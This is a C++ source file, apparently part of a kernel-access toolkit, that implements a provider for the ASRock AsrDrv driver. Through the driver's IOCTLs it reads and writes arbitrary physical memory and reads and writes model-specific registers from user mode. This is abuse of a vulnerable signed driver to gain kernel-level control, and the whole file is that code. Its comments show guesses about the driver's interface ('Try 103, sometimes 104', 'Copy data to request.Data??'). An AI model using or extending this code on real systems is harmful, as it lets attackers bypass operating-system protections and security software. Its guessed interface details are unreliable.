/**
 * @file AsrDrvProvider.cpp
 * @author GitHub Copilot
 * @date January 29, 2026
 * @brief ASRock AsrDrv provider implementation.
 */

#include "AsrDrvProvider.h"
#include <cstring>

namespace KernelMode {
    namespace Providers {

        AsrDrvProvider::AsrDrvProvider() : BaseProvider(CreateConfig()) {
        }

        ProviderConfig AsrDrvProvider::CreateConfig() {
            ProviderConfig config = {};
            
            config.providerName = L"ASRock AsrDrv Provider";
            config.deviceName = L"AsrDrv103"; // Try 103, sometimes 104
            config.serviceName = L"AsrDrv103";
            config.driverId = 62; // DRIVER_ID_ASRDRV
            
            config.capabilities = 
                CAPABILITY_PHYSICAL_MEMORY |
                CAPABILITY_PREFER_PHYSICAL;
            
            // IOCTL codes for BaseProvider (We override Read/Write so these might be unused or used for 4-byte ops)
            // But we set them anyway if helpful.
            config.readPhysicalIOCTL = 0; // We define custom methods
            config.writePhysicalIOCTL = 0;
            
            // Load data
            config.loadData = CreateLoadData();
            
            return config;
        }

        ProviderLoadData AsrDrvProvider::CreateLoadData() {
            ProviderLoadData loadData = {};
            
            loadData.PhysMemoryBruteForce = false;
            loadData.PML4FromLowStub = false;
            loadData.PreferPhysical = true;
            loadData.RequiresDSE = false;
            loadData.Capabilities = CAPABILITY_PHYSICAL_MEMORY | CAPABILITY_PREFER_PHYSICAL;
            loadData.Description = L"ASRock AsrDrv driver - MSR and Physical Memory";
            
            return loadData;
        }

        bool AsrDrvProvider::ReadPhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
            if (!IsValidHandle() || !buffer || size == 0) {
                return false;
            }

            // AsrDrv IOCTL 0x222808 typically reads 1/2/4 bytes into the OutputBuffer.
            // ASR_MEMORY_REQUEST struct usually specifies what to read.
            // Because this is an older OLS-style interface, we likely need to chunk it.
            
            uint8_t* byteBuffer = static_cast<uint8_t*>(buffer);
            size_t bytesRead = 0;
            
            while (bytesRead < size) {
                ASR_MEMORY_REQUEST request = {};
                request.Address.QuadPart = physicalAddress + bytesRead;
                request.Size = 4; // Default to 4 bytes
                
                // Adjust for end of buffer
                if (size - bytesRead < 4) {
                    request.Size = static_cast<ULONG>(size - bytesRead);
                }
                
                // Align access if needed? (Usually OLS handles misalignment or we should align)
                // For simplicity, we try 4 byte chunks.
                
                ULONG data = 0;
                DWORD bytesReturned = 0;
                
                // Note: The structure is passed as Input. The Result is in Output (Generic OLS behavior)
                // Or sometimes Result is in the 'Data' field of the struct passed as IN/OUT.
                // For 0x222808 (Read Memory), usually Input=ASR_MEMORY_REQUEST, Output=ASR_MEMORY_REQUEST?
                // Or Output=ULONG?
                // Standard OLS: Output buffer contains the data read.
                
                if (DeviceIoControl(
                    deviceHandle_,
                    IOCTL_ASR_READ_MEMORY,
                    &request,
                    sizeof(request),
                    &data, // Read into local variable
                    sizeof(data),
                    &bytesReturned,
                    NULL
                )) {
                    // Success, copy data to buffer
                    // Using memcpy to handle partial reads/writes safely
                    memcpy(byteBuffer + bytesRead, &data, request.Size);
                    bytesRead += request.Size;
                }
                else {
                    // Try 1 byte if 4 failed (alignment?)
                    if (request.Size > 1) {
                         request.Size = 1;
                         if (DeviceIoControl(
                            deviceHandle_,
                            IOCTL_ASR_READ_MEMORY,
                            &request,
                            sizeof(request),
                            &data,
                            sizeof(data),
                            &bytesReturned,
                            NULL
                        )) {
                            memcpy(byteBuffer + bytesRead, &data, 1);
                            bytesRead += 1;
                            continue;
                        }
                    }
                    return false;
                }
            }
            
            return true;
        }

        bool AsrDrvProvider::WritePhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
             if (!IsValidHandle() || !buffer || size == 0) {
                return false;
            }

            uint8_t* byteBuffer = static_cast<uint8_t*>(buffer);
            size_t bytesWritten = 0;

            while (bytesWritten < size) {
                ASR_MEMORY_REQUEST request = {};
                request.Address.QuadPart = physicalAddress + bytesWritten;
                request.Size = 4;
                
                if (size - bytesWritten < 4) {
                    request.Size = static_cast<ULONG>(size - bytesWritten);
                }

                // Copy data to request.Data??
                // For WRITE (0x22280C), usually Input struct contains the data to write.
                // ASR_MEMORY_REQUEST has 'Data' field.
                
                uint32_t dataToWrite = 0;
                memcpy(&dataToWrite, byteBuffer + bytesWritten, request.Size);
                request.Data = dataToWrite;

                DWORD bytesReturned = 0;
                if (!DeviceIoControl(
                    deviceHandle_,
                    IOCTL_ASR_WRITE_MEMORY,
                    &request,
                    sizeof(request),
                    NULL,
                    0,
                    &bytesReturned,
                    NULL
                )) {
                     // Try single byte
                     if (request.Size > 1) {
                        request.Size = 1;
                        memcpy(&dataToWrite, byteBuffer + bytesWritten, 1);
                        request.Data = dataToWrite;
                        if (!DeviceIoControl(
                            deviceHandle_,
                            IOCTL_ASR_WRITE_MEMORY,
                            &request,
                            sizeof(request),
                            NULL,
                            0,
                            &bytesReturned,
                            NULL
                        )) {
                             return false;
                        }
                        bytesWritten += 1;
                        continue;
                     }
                    return false;
                }

                bytesWritten += request.Size;
            }

            return true;
        }

        bool AsrDrvProvider::ReadMsr(ULONG msrIndex, ULONG64* value) {
            if (!IsValidHandle() || !value) return false;

            ASR_MSR_REQUEST request = {};
            request.Register = msrIndex;

            // Output buffer usually receives the full struct with Value filled
            ASR_MSR_REQUEST result = {};
            DWORD bytesReturned = 0;

            if (DeviceIoControl(
                deviceHandle_,
                IOCTL_ASR_READ_MSR,
                &request,
                sizeof(request),
                &result,
                sizeof(result),
                &bytesReturned,
                NULL
            )) {
                *value = result.Value.QuadPart;
                return true;
            }
            return false;
        }

        bool AsrDrvProvider::WriteMsr(ULONG msrIndex, ULONG64 value) {
            if (!IsValidHandle()) return false;

            ASR_MSR_REQUEST request = {};
            request.Register = msrIndex;
            request.Value.QuadPart = value;

            DWORD bytesReturned = 0;
            // Write MSR usually takes input only
            return DeviceIoControl(
                deviceHandle_,
                IOCTL_ASR_WRITE_MSR,
                &request,
                sizeof(request),
                NULL,
                0,
                &bytesReturned,
                NULL
            );
        }

    } // namespace Providers
} // namespace KernelMode
